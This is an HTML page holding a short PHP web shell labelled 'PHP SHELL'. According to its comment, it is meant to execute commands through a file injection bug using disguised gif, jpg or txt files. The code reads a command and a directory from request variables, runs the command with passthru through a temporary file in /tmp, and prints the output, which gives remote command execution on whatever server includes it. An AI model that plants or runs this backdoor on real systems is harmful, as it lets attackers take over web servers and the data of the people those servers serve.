   <font color="#808080"><br></font><font color="#008000"><center><b><font face="verdana" size="2">CMD</font></b> <font face="verdana" size="2"> - System CoManD<br><br></font></center></font><font face="Verdana" size="1"><font color="#008000"><br>
   <b>#</b> CMD PHP : <h1>PHP SHELL</h1><br>
   <b>#</b></b></font><br>
   <br>
   <br>
   <hr color="#000000" width=80% height=115px>
   <br>
   <div align="center">
     <table border="1" cellpadding="0" cellspacing="0" width="633" height="17" bordercolorlight="#000080" bordercolordark="#000080">
       <tr>
         <td width="633" height="17">
   <pre><font color="gray" font face="Tahoma" size="2">
   <?
     // CMD - To Execute Command on File Injection Bug ( gif - jpg - txt )
     if (isset($chdir)) @chdir($chdir);
     ob_start();
      passthru("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
     $output = ob_get_contents();
     ob_end_clean();
     if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
   ?>
   </font></pre>
    </tr>
     </table>
   </div>

   <br>
   <hr color="#000000" width=80% height=115px>
   <p align="left">
   <br>
   <b> <font face="Verdana" size="1" color="#008000">PHP SHELL</font></b> <font face="Verdana" size="1" color="#008000"><br><b>
   #<a href="mailto:PHPSHELL@bol.com.br">Contact
         Us</font></a></b><br><font face="Verdana" size="1" color="#008000"><b>#
   :D </b>
   </font>
